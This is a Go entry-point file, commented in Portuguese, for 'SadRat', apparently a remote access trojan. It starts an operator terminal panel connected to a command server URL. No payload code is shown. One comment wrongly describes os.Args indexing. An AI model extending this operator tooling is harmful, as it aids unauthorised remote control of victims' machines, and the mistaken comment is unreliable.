package main

import (
	"fmt"
	"os"
	
	// 1. O import em branco ("_") é obrigatório para ativar a funcionalidade de embed no Go
	_ "embed" 

	tea "github.com/charmbracelet/bubbletea"
	"github.com/VitorDie/SadRat/internal/factory"
	"github.com/VitorDie/SadRat/internal/presentation/cli"
)

// ==========================================
// EMBED DOS BANNERS ASCII
// O Go vai ler os arquivos .txt na hora de compilar e jogar nas variáveis!
// ==========================================

//go:embed left_banner.txt
var leftBanner string

//go:embed right_banner2.txt
var rightBanner string

func main() {
	// ==========================================
	// LEITURA DOS ARGUMENTOS DA CLI (argv)
	// ==========================================
	// os.Args é sempre o nome do próprio programa (ex: "./client")
	// os.Args[4] será o primeiro argumento real
	if len(os.Args) < 2 {
		// Se o operador não passar a URL, mostramos como usar e encerramos (exit 1)
		fmt.Println("Uso correto: ./client <http://ip-do-server:porta>")
		os.Exit(1)
	}
	
	// Capturamos a URL do servidor direto do terminal!
	serverURL := os.Args[1]


	// ==========================================
	// INICIALIZAÇÃO DA ARQUITETURA
	// ==========================================
	// Injetamos a URL dinâmica na nossa Fábrica
	ratFactory := factory.NewRatFactoryHttp(nil, serverURL)
	clientHTTP := ratFactory.CreateClient()


	// ==========================================
	// INICIALIZAÇÃO DA INTERFACE GRÁFICA (TUI)
	// ==========================================
	// Passamos os banners mágicos lidos pelo embed para o modelo do Bubble Tea
	appModel := cli.NewRatModel(clientHTTP, leftBanner, rightBanner)

	p := tea.NewProgram(appModel)
	if _, err := p.Run(); err != nil {
		fmt.Printf("Falha ao iniciar o painel do SadRat: %v", err)
		os.Exit(1)
	}
}